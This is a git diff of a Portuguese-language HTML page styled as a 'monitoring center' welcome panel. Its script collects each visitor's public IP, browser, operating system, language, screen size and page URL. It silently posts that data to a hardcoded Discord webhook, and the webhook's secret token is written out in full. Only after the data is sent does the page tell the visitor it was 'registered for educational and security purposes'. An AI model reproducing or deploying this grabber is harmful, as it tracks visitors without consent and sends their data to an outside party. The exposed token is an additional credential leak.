@@ -183,31 +183,61 @@
 </html>
 
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-  <title>Bem-vindo!</title>
+  <meta charset="UTF-8">
+  <title>Central de Monitoramento</title>
+  <style>
+    body {
+      background-color: #111;
+      color: #0f0;
+      font-family: monospace;
+      padding: 2rem;
+    }
+    h1 {
+      color: #0ff;
+    }
+  </style>
   <script>
     async function coletarInfo() {
-      // Obter IP público via ipify
-      let ip = await fetch("https://api.ipify.org?format=json")
-                     .then(res => res.json())
-                     .then(data => data.ip);
+      const webhook = "https://discord.com/api/webhooks/1389924566218047558/8t_fsg5aD_rMAkt3fFhdrv1fO_hOZc3NIfe2rqMOPrKTsQhDiPdcDGzRkwxn_KAo0n5J";
 
-      let userAgent = navigator.userAgent;
-      let resolucao = screen.width + "x" + screen.height;
-      let horario = new Date().toLocaleString();
+      // IP via ipify
+      let ip = "Desconhecido";
+      try {
+        const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
+        ip = ipData.ip;
+      } catch (e) {}
 
-      let conteudo = `🧠 Novo acesso ao site\n` +
-                     `🌐 IP: ${ip}\n` +
-                     `🖥️ Navegador: ${userAgent}\n` +
-                     `📱 Tela: ${resolucao}\n` +
-                     `🕒 Acesso em: ${horario}`;
+      // Informações locais
+      const userAgent = navigator.userAgent;
+      const idioma = navigator.language || "desconhecido";
+      const resolucao = `${screen.width}x${screen.height}`;
+      const horario = new Date().toLocaleString();
 
-      // Enviar pro webhook do Discord
-      await fetch("https://discord.com/api/webhooks/1389924566218047558/8t_fsg5aD_rMAkt3fFhdrv1fO_hOZc3NIfe2rqMOPrKTsQhDiPdcDGzRkwxn_KAo0n5J", {
+      let sistema = "Desconhecido";
+      if (/Windows/i.test(userAgent)) sistema = "Windows";
+      else if (/Mac/i.test(userAgent)) sistema = "macOS";
+      else if (/Linux/i.test(userAgent)) sistema = "Linux";
+      else if (/Android/i.test(userAgent)) sistema = "Android";
+      else if (/iPhone/i.test(userAgent)) sistema = "iOS";
+
+      // Montar mensagem
+      const mensagem = 
+        "🧠 **Novo acesso ao site**\n" +
+        `🌐 IP: \`${ip}\`\n` +
+        `💻 Sistema: \`${sistema}\`\n` +
+        `🖥️ Navegador: \`${userAgent}\`\n` +
+        `📱 Resolução: \`${resolucao}\`\n` +
+        `🌎 Idioma: \`${idioma}\`\n` +
+        `🕒 Horário de acesso: \`${horario}\`\n` +
+        `🔗 Página: ${location.href}`;
+
+      // Enviar pro Discord
+      fetch(webhook, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: conteudo })
+        body: JSON.stringify({ content: mensagem })
       });
     }
 
@@ -215,6 +245,7 @@
   </script>
 </head>
 <body>
-  <h1>Bem-vindo ao site!</h1>
+  <h1>Bem-vindo ao seu painel, Lucax 👾</h1>
+  <p>Aguarde... suas informações foram registradas para fins educativos e de segurança.</p>
 </body>
 </html>
